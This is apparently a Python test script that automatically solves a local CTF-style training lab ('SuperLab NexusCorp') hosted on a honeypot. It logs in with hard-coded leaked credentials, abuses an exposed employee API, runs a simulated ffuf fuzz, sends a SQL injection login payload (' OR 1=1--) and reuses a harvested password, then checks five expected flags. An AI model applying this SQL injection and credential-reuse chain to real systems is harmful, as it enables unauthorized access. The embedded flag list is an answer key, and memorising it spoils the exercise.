#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
solve_superlab.py — Resuelve automáticamente la cadena SuperLab NexusCorp.

Uso (servidor FlyPaper en marcha):
  python tests/solve_superlab.py
  python tests/solve_superlab.py --base http://127.0.0.1:5000

Requisitos: pip install requests
"""

from __future__ import annotations

import argparse
import re
import sys

try:
    import requests
except ImportError:
    print("Instala requests: pip install requests")
    sys.exit(1)

LEGACY_USER = "legacy_support"
LEGACY_PASS = "Soporte2019!"
FFUF_CMD = "ffuf -u https://web-nexuscorp-2.0.local/FUZZ -w wordlist.txt"
SQLI_USER = "' OR 1=1--"
VACATION_USER = "m.sanchez"
MSG_ID = "it-provisionales-incidente"

FLAGS_ESPERADAS = [
    "flag{fase1_credenciales_filtradas}",
    "flag{fase2_control_acceso_roto}",
    "flag{fase3_sqli_login}",
    "flag{fase4_mensaje_correcto}",
    "flag{fase5_final_cadena_completa}",
]


def _extraer_flag(texto: str, prefijo: str = "flag{") -> list[str]:
    return re.findall(r"flag\{[^}]+\}", texto or "")


def main() -> int:
    parser = argparse.ArgumentParser(description="Auto-solver SuperLab NexusCorp")
    parser.add_argument(
        "--base",
        default="http://127.0.0.1:5000",
        help="URL base del honeypot (default: http://127.0.0.1:5000)",
    )
    args = parser.parse_args()
    base = args.base.rstrip("/")
    sesion = requests.Session()
    capturadas: list[str] = []

    print("[*] Paso 0 — robots.txt")
    r = sesion.get(f"{base}/robots.txt", timeout=15)
    r.raise_for_status()
    assert "web-nexuscorp-2.0" in r.text
    print("    OK — pista Disallow visible")

    print("[*] Paso 1 — login legacy")
    r = sesion.post(
        f"{base}/web-nexuscorp-2.0/login",
        data={"usuario": LEGACY_USER, "password": LEGACY_PASS},
        timeout=15,
        allow_redirects=True,
    )
    r.raise_for_status()
    flags = _extraer_flag(r.text)
    if flags:
        capturadas.append(flags[0])
        print(f"    Flag: {flags[0]}")

    print("[*] Paso 2 — API empleados")
    r = sesion.get(f"{base}/web-nexuscorp-2.0/api/empleados", timeout=15)
    r.raise_for_status()
    data = r.json()
    if data.get("flag"):
        capturadas.append(data["flag"])
        print(f"    Flag: {data['flag']}")

    print("[*] Paso 3 — fuzzer ffuf simulado")
    r = sesion.post(
        f"{base}/tools/fuzzer",
        data={"comando": FFUF_CMD},
        timeout=15,
    )
    r.raise_for_status()
    assert "web-nexuscorp-2.0-staging" in r.text
    print("    OK — staging descubierto en salida")

    print("[*] Paso 4 — SQLi staging")
    r = sesion.post(
        f"{base}/web-nexuscorp-2.0-staging/login",
        data={"usuario": SQLI_USER, "password": "x"},
        timeout=15,
    )
    r.raise_for_status()
    for f in _extraer_flag(r.text):
        if f not in capturadas:
            capturadas.append(f)
            print(f"    Flag: {f}")

    print("[*] Paso 5 — mensaje provisionales")
    r = sesion.get(
        f"{base}/web-nexuscorp-2.0-staging/mensajes/{MSG_ID}",
        timeout=15,
    )
    r.raise_for_status()
    for f in _extraer_flag(r.text):
        if f not in capturadas:
            capturadas.append(f)
            print(f"    Flag: {f}")

    m = re.search(
        rf"{re.escape(VACATION_USER)}\s*\|\s*([^\s|]+)",
        r.text,
        re.IGNORECASE,
    )
    if not m:
        print("[!] No se encontró password_provisional de m.sanchez en el mensaje")
        return 1
    provisional = m.group(1).strip()
    print(f"    Provisional m.sanchez: {provisional}")

    print("[*] Paso 6 — login final NexusCorp")
    r = sesion.post(
        f"{base}/web-nexuscorp/login",
        data={"usuario": VACATION_USER, "password": provisional},
        timeout=15,
        allow_redirects=True,
    )
    r.raise_for_status()
    if "panel-superlab" not in r.url and "panel-superlab" not in r.text:
        print(f"[!] No redirigió al panel (url={r.url})")
        return 1
    for f in _extraer_flag(r.text):
        if f not in capturadas:
            capturadas.append(f)

    r = sesion.get(f"{base}/web-nexuscorp/panel-superlab", timeout=15)
    r.raise_for_status()
    for f in _extraer_flag(r.text):
        if f not in capturadas:
            capturadas.append(f)

    print("\n=== Flags capturadas ===")
    for f in capturadas:
        print(f"  • {f}")

    faltan = [f for f in FLAGS_ESPERADAS if f not in capturadas]
    if faltan:
        print("\n[!] Faltan flags:", ", ".join(faltan))
        return 1

    print("\n[OK] Cadena SuperLab completada (5/5 flags).")
    return 0


if __name__ == "__main__":
    sys.exit(main())
